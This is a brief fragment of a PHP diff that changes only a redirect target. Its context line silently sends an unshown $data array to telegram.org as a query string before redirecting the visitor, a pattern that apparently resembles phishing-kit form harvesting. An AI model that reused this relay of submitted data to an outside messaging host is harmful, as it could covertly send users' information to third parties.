@@ -15,5 +15,5 @@ $data = [
 ];
 $response = @file_get_contents("https://telegram.org?" . http_build_query($data));
 
-header("Location: /dk/api/brbrb/bet.html");
+header("Location:/bet.html");
 exit();
